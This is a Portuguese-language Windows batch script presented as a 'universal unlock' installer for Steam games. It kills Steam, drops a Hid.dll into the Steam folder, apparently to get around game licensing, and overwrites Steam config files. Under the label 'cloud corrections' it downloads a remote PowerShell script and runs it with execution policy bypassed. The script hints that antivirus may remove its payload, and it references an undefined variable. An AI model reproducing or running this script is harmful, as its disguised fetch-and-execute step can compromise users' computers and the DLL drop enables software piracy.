@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title STEAMLIVRE - Sistema de Desbloqueio Universal
mode con: cols=90 lines=25

:: =====================================================
:: CONFIGURAÇÕES INTERNAS
:: =====================================================
set "ARQUIVO_ZIP=Pmw games unlock.zip"
set "URL_FIX=https://raw.githubusercontent.com/KRAYz-Oficial/KRAYz-Oficial/67065f398be63e1fe2c29ef2838f3030490eb3b6/Remover-bugs.ps1"
set ""

:: =====================================================
:: INTERFACE INICIAL
:: =====================================================
:Inicio
cls
color 0B
echo.
echo  ╔══════════════════════════════════════════════════════════════════════════════╗
echo  ║                         STEAMLIVRE - INSTALADOR                              ║
echo  ╠══════════════════════════════════════════════════════════════════════════════╣
echo  ║                                                                              ║
echo  ║  [1] BUSCANDO DIRETÓRIOS...                                                  ║
echo  ║                                                                              ║
echo  ╚══════════════════════════════════════════════════════════════════════════════╝
echo.

:: Detectar Steam
for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do (set "steamExe=%%A %%B")
if not defined steamExe (
    color 0C
    echo  [!] ERRO: Steam não encontrada. Instale a Steam antes de continuar.
    pause
    exit /b
)

for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"
set "configDir=%steamDir%\config"

:: Verificação do ZIP
if not exist "%ARQUIVO_ZIP%" (
    color 0C
    echo  [!] ERRO: Arquivo de dados não encontrado. Verifique o antivírus.
    pause
    exit /b
)

echo  [^OK] Local: %steamDir%
timeout /t 2 >nul

:: =====================================================
:: PROCESSO DE INSTALAÇÃO
:: =====================================================
cls
echo.
echo  ╔══════════════════════════════════════════════════════════════════════════════╗
echo  ║                       INSTALANDO COMPONENTES DE ID                           ║
echo  ╚══════════════════════════════════════════════════════════════════════════════╝
echo.

echo  [-] Encerrando Steam...
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
timeout /t 1 >nul

echo  [+] Extraindo banco de dados (6.7MB)...
if exist "%temp%\pmw_temp" rmdir /s /q "%temp%\pmw_temp"
powershell -Command "Expand-Archive '%ARQUIVO_ZIP%' -DestinationPath $env:TEMP\pmw_temp -Force"

echo  [+] Configurando Hid.dll e Plugins...
xcopy /e /i /y "%temp%\pmw_temp\Config\*" "%configDir%\" >nul
copy /y "%temp%\pmw_temp\Hid.dll" "%steamDir%\" >nul

call :BarraBonita

:: Finalização
rmdir /s /q "%temp%\pmw_temp" >nul
echo.
echo  [+] Aplicando correções de nuvem...
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb '%URL_FIX%' | iex"

echo  [+] Abrindo Dashboard...
start "" "%URL_AGRADECIMENTO%"
start "" "%steamExe%"

cls
color 0A
echo.
echo  ╔══════════════════════════════════════════════════════════════════════════════╗
echo  ║                    INSTALAÇÃO CONCLUÍDA COM SUCESSO!                         ║
echo  ╠══════════════════════════════════════════════════════════════════════════════╣
echo  ║                                                                              ║
echo  ║  O seu sistema foi atualizado para aceitar qualquer ID de jogo.              ║
echo  ║  A Steam será reiniciada em instantes.                                       ║
echo  ║                                                                              ║
echo  ╚══════════════════════════════════════════════════════════════════════════════╝
echo.
timeout /t 5
exit /b

:: =====================================================
:: FUNÇÃO DA BARRA DE PROGRESSO "MODERNA"
:: =====================================================
:BarraBonita
echo.
set "bar="
set "space=                    "
echo  Progresso da Instalação:
for /L %%i in (1,1,20) do (
    set "bar=!bar!█"
    set "space=!space:~1!"
    cls
    echo.
    echo  ╔══════════════════════════════════════════════════════════════════════════════╗
    echo  ║                       INSTALANDO COMPONENTES DE ID                           ║
    echo  ╚══════════════════════════════════════════════════════════════════════════════╝
    echo.
    echo  Status: Sincronizando arquivos...
    echo.
    echo  [!bar!!space!] 
    echo.
    timeout /t 0 /nobreak >nul
)
goto :eof